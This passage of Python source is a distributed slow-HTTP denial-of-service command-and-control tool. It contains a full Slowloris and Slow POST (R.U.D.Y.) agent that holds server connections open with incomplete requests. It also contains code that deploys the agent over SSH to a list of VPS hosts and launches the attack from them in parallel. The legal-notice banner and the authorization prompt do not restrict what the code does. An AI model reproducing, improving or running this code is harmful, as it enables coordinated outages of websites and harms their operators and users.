                self.stats['errors'] += 1
            return None
    
    def slowloris_attack(self, num_conns=100, delay=15, duration=0):
        """Fixed Slowloris attack implementation"""
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, SSL: {self.use_ssl}")
        
        self.running = True
        start_time = time.time()
        
        # Phase 1: Create initial connections
        print("[PHASE1] Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock = self.create_socket()
            if sock:
                try:
                    # FIXED: Proper HTTP request format
                    request_lines = [
                        f"GET /?id={random.randint(1000,99999)} HTTP/1.1",
                        f"Host: {self.host}",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language: en-US,en;q=0.5",
                        "Connection: keep-alive"
                    ]
                    
                    # Send initial headers (incomplete request)
                    for line in request_lines:
                        sock.send((line + "\\r\\n").encode())
                        time.sleep(0.001)
                    
                    # Do NOT send final \\r\\n - keeps request incomplete
                    
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
                    try:
                        sock.close()
                    except:
                        pass
            
            time.sleep(0.05)
        
        with self.lock:
            self.stats['active'] = len(self.conns)
        
        print(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
        
        if not self.conns:
            print("[ERROR] No connections established")
            return
        
        # Phase 2: Keep connections alive
        print("[PHASE2] Starting keep-alive phase...")
        cycle_count = 0
        
        while self.running and self.conns:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            cycle_count += 1
            dead_conns = []
            
            # Send fake headers to keep connections alive
            for sock in self.conns:
                try:
                    header_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
                    header_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
                    fake_header = f"X-{header_name}: {header_value}\\r\\n"
                    
                    sock.send(fake_header.encode())
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        self.stats['bytes_sent'] += len(fake_header)
                        
                except Exception:
                    dead_conns.append(sock)
                    with self.lock:
                        self.stats['errors'] += 1
            
            # Remove dead connections and replace them
            for sock in dead_conns:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
            
            # Try to maintain connection count
            connections_to_replace = min(len(dead_conns), 10)
            for _ in range(connections_to_replace):
                if not self.running:
                    break
                
                new_sock = self.create_socket()
                if new_sock:
                    try:
                        initial_request = f"GET /?replace={random.randint(1000,99999)} HTTP/1.1\\r\\nHost: {self.host}\\r\\n"
                        new_sock.send(initial_request.encode())
                        
                        self.conns.append(new_sock)
                        with self.lock:
                            self.stats['sent'] += 1
                    except:
                        try:
                            new_sock.close()
                        except:
                            pass
                        break
            
            with self.lock:
                self.stats['active'] = len(self.conns)
                active = self.stats['active']
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            print(f"[CYCLE {cycle_count}] Active: {active}, Sent: {sent}, Bytes: {bytes_sent}, Errors: {errors}")
            
            time.sleep(delay)
        
        self.stop()
    
    def slow_post_attack(self, num_conns=50, delay=1, duration=0):
        """Fixed Slow POST attack implementation"""
        print(f"[SLOW POST] Starting R.U.D.Y attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, SSL: {self.use_ssl}")
        
        self.running = True
        start_time = time.time()
        
        def post_worker(worker_id):
            sock = self.create_socket()
            if not sock:
                return
            
            try:
                content_length = random.randint(1000000, 50000000)
                
                # FIXED: Proper POST headers
                post_headers = [
                    f"POST /upload{worker_id} HTTP/1.1",
                    f"Host: {self.host}",
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {content_length}",
                    "Connection: keep-alive",
                    ""
                ]
                
                headers_data = "\\r\\n".join(post_headers) + "\\r\\n"
                sock.send(headers_data.encode())
                
                with self.lock:
                    self.stats['sent'] += 1
                    self.stats['bytes_sent'] += len(headers_data)
                
                print(f"[WORKER {worker_id}] Headers sent, content-length: {content_length:,}")
                
                # Send POST body slowly
                bytes_sent = 0
                chunk_sizes = [1, 2, 3, 5, 8, 10]
                
                while self.running and bytes_sent < content_length:
                    if duration > 0 and (time.time() - start_time) >= duration:
                        break
                    
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    field_name = f"field{random.randint(1, 100)}"
                    field_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(remaining - len(field_name) - 1))
                    chunk_data = f"{field_name}={field_value}"[:remaining]
                    
                    try:
                        sock.send(chunk_data.encode())
                        bytes_sent += len(chunk_data)
                        
                        with self.lock:
                            self.stats['sent'] += len(chunk_data)
                            self.stats['bytes_sent'] += len(chunk_data)
                            
                    except Exception:
                        break
                    
                    if bytes_sent % 100000 == 0:
                        progress = (bytes_sent / content_length) * 100
                        print(f"[WORKER {worker_id}] Progress: {progress:.1f}%")
                    
                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)
                    time.sleep(sleep_time)
                
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # Start worker threads
        threads = []
        for i in range(num_conns):
            if not self.running:
                break
            
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        # Monitor threads
        while self.running and threads:
            if duration > 0 and (time.time() - start_time) >= duration:
                self.running = False
                break
            
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
                bytes_sent = self.stats['bytes_sent']
            
            print(f"[STATUS] Active workers: {active_threads}/{num_conns} | Bytes: {bytes_sent:,} | Errors: {errors}")
            
            if active_threads == 0:
                break
            
            threads = [t for t in threads if t.is_alive()]
            time.sleep(10)
        
        self.stop()
    
    def stop(self):
        """Stop attack and cleanup connections"""
        self.running = False
        
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        
        with self.lock:
            self.stats['active'] = 0

# Global attacker instance
attacker = None

def signal_handler(sig, frame):
    global attacker
    print("\\n[SIGNAL] Received interrupt signal")
    if attacker:
        attacker.stop()
    sys.exit(0)

def main():
    global attacker
    
    parser = argparse.ArgumentParser(description='Fixed Slow HTTP Agent')
    parser.add_argument('target', help='Target URL or hostname')
    parser.add_argument('attack_type', choices=['slowloris', 'slow_post'], help='Attack type')
    parser.add_argument('--connections', '-c', type=int, default=100, help='Number of connections')
    parser.add_argument('--delay', '-d', type=int, default=15, help='Delay between packets')
    parser.add_argument('--duration', '-t', type=int, default=0, help='Duration (0=unlimited)')
    
    args = parser.parse_args()
    
    if args.connections < 1:
        print("ERROR: Connections must be at least 1")
        sys.exit(1)
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        parsed = urlparse(args.target)
        target_host = parsed.hostname
        target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
    else:
        if ':' in args.target:
            target_host, port_str = args.target.split(':', 1)
            try:
                target_port = int(port_str)
            except ValueError:
                target_port = 80
        else:
            target_host = args.target
            target_port = 80
        use_ssl = target_port == 443
    
    print("=" * 80)
    print("FIXED SLOW HTTP ATTACK AGENT")
    print("=" * 80)
    print(f"Target: {target_host}:{target_port}")
    print(f"SSL: {use_ssl}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections}")
    print(f"Delay: {args.delay}s")
    print("=" * 80)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    attacker = SlowHTTPAttack(target_host, target_port, use_ssl)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        attacker.stop()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop()

if __name__ == "__main__":
    main()
'''
        
        # Deploy agent using proper file transfer
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"
        ]
        
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        # Transfer file
        try:
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(agent_script)
                
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                
                os.remove(temp_file)
                
            else:
                return False, "No SSH connection available"
        
        except Exception as e:
            # Fallback to base64 method with chunking
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            
            chunk_size = 4000
            chunks = [encoded_script[i:i+chunk_size] for i in range(0, len(encoded_script), chunk_size)]
            
            self.execute_command(ip, "rm -f /tmp/slowhttp_c2/agent.py")
            
            for i, chunk in enumerate(chunks):
                if i == 0:
                    cmd = f"echo '{chunk}' | base64 -d > /tmp/slowhttp_c2/agent.py"
                else:
                    cmd = f"echo '{chunk}' | base64 -d >> /tmp/slowhttp_c2/agent.py"
                
                success, output = self.execute_command(ip, cmd)
                if not success:
                    return False, f"Transfer failed at chunk {i+1}: {output}"
        
        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -c \"import py_compile; py_compile.compile('/tmp/slowhttp_c2/agent.py', doraise=True)\"",
            "python3 /tmp/slowhttp_c2/agent.py --help | head -3"
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=30)
            if not success:
                return False, f"Final step {i+1} failed: {output}"
        
        return True, "Fixed agent deployed successfully"
    
    def get_connection_status(self, ip):
        with self.lock:
            return ip in self.connections
    
    def close_all_connections(self):
        with self.lock:
            for ip in list(self.connections.keys()):
                try:
                    self.connections[ip].close()
                except:
                    pass
            self.connections.clear()

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with FIXED command building"""
        
        # Parse target properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
        else:
            target_host = target_url.split(':')[0].split('/')[0]
            if ':' in target_url:
                try:
                    target_port = int(target_url.split(':')[1])
                    use_ssl = target_port == 443
                except ValueError:
                    target_port = 80
                    use_ssl = False
            else:
                target_port = 80
                use_ssl = False
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        target_spec = f"https://{target_host}:{target_port}" if use_ssl else f"{target_host}:{target_port}"
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching FIXED {attack_type} on {target_spec}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Build FIXED attack command
            cmd = self._build_fixed_command(target_spec, attack_type, parameters)
            
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            if success and ("Starting attack" in output or "SLOWLORIS" in output or "SLOW POST" in output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {output[:100]}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] FIXED attack launched on {success_count}/{len(vps_list)} VPS{Colors.RESET}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _build_fixed_command(self, target_spec, attack_type, parameters):
        """Build FIXED attack command"""
        connections = max(1, parameters.get('connections', 100))
        delay = max(0, parameters.get('delay', 15))
        duration = parameters.get('duration', 0)
        
        cmd = "cd /tmp/slowhttp_c2 && "
        cmd += "if [ ! -f agent.py ]; then echo 'ERROR: agent.py not found'; exit 1; fi && "
        cmd += f"nohup python3 agent.py '{target_spec}' {attack_type} "
        cmd += f"--connections {connections} --delay {delay} "
        
        if duration > 0:
            cmd += f"--duration {duration} "
        
        timestamp = int(time.time())
        cmd += f"> attack_{timestamp}.log 2>&1 & "
        cmd += "sleep 3 && "
        cmd += "tail -10 attack_*.log 2>/dev/null | head -5"
        
        return cmd
    
    def stop_attack(self, session_id):
        """Stop attack with enhanced cleanup"""
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[STOPPING] Stopping attack on all VPS...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            commands = [
                "pkill -f 'python3.*agent.py' 2>/dev/null || true",
                "sleep 2",
                "pkill -9 -f 'agent.py' 2>/dev/null || true",
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if "wc -l" in cmd and success and output.strip().isdigit():
                    remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.YELLOW}PARTIAL{Colors.RESET}")
                stop_count += 1
        
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        
        return True, f"Stop command sent to {stop_count} VPS"
    
    def get_attack_status(self, session_id):
        """Get enhanced attack status"""
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            if success and output.strip().isdigit():
                active_processes = int(output.strip())
            else:
                active_processes = 0
            
            # Get network connections if processes are running
            conn_info = ""
            if active_processes > 0:
                conn_cmd = "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l"
                conn_success, conn_output = self.ssh_manager.execute_command(vps_ip, conn_cmd)
                if conn_success and conn_output.strip().isdigit():
                    conn_info = f"({conn_output.strip()} conns)"
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections_info': conn_info
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        self.ssh_manager.close_all_connections()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                        COMPLETE FIXED EDITION v4.0                          ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️ WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}
"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch FIXED Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def run(self):
        while self.running:
            try:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attack()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '0':
                    print(f"{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")

def main():
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    try:
        import paramiko
        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Install with: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    os.makedirs('logs', exist_ok=True)
    os.makedirs('config', exist_ok=True)
    
    print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                               LEGAL NOTICE                                ║
║                                                                           ║
║ This tool is for EDUCATIONAL and AUTHORIZED PENETRATION TESTING ONLY     ║
║ Unauthorized use against systems you don't own is ILLEGAL               ║
║ Users are solely responsible for compliance with applicable laws         ║
║                                                                           ║
║ By proceeding, you acknowledge proper authorization and legal compliance ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
    
    confirm = input(f"{Colors.YELLOW}Do you have proper written authorization? (yes/no): {Colors.RESET}").strip().lower()
    if confirm not in ['yes', 'y']:
        print(f"{Colors.RED}Authorization required. Exiting.{Colors.RESET}")
        sys.exit(0)
    
    try:
        print("Starting Complete Fixed Slow HTTP C2...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
